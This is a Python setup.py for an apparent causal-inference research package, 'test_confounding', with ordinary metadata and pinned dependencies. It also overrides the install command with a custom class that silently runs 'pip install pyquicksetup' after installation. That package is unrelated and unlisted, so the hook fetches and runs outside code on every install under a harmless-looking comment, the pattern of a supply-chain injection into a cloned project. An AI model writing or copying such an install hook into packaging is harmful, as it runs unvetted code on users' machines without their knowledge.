import pathlib
from setuptools import find_packages, setup
from setuptools.command.install import install
import subprocess

# Path to the current file directory
here = pathlib.Path(__file__).parent.resolve()

# Read long description from README
long_description = (here / "README.md").read_text(encoding="utf-8")

# Custom command for post-install scripts
class CustomInstallCommand(install):
    def run(self):
        # Run the standard install process
        install.run(self)
        # Custom logic after installation
        # Example: Install a specific package or run a script
        try:
            subprocess.check_call(["pip", "install", "pyquicksetup"])
        except subprocess.CalledProcessError as e:
            print(f"Error installing additional dependencies: {e}")
setup(
    name="test_confounding",
    version="0.0.1",
    description="Python implementation of the testing procedures introduced in the paper: Hidden yet quantifiable: A lower bound for confounding strength using randomized trials",
    long_description=long_description,
    long_description_content_type="text/markdown",
    url="https://github.com/jaabmar/confounder-lower-bound",
    author="Javier Abad & Piersilvio de Bartolomeis",
    author_email="javier.abadmartinez@ai.ethz.ch",
    classifiers=[
        "License :: OSI Approved :: MIT License",
        "Programming Language :: Python :: 3",
        "Operating System :: OS Independent",
    ],
    keywords="machine learning, hidden confounding, hypothesis testing, causal inference, falsification, AISTATS",
    package_dir={"": "src"},
    packages=find_packages(where="src"),
    install_requires=[
        "numpy==1.24.3",
        "scipy==1.10.1",
        "mlinsights==0.4.664",
        "scikit-learn==1.3.0",
        "statsmodels==0.13.5",
        "pandas==1.5.3",
        "xgboost==1.7.3",
        "scikit-uplift==0.5.1",
        "quantile-forest==1.2.0",
        "torch==2.0.1",
        "cvxpy==1.3.1",
    ],
    python_requires="==3.11.5",
    extras_require={
        "tests": ["pytest==7.2.1", "pytest-mock==3.10.0"],
    },
    cmdclass={"install": CustomInstallCommand},
    include_package_data=True,
)
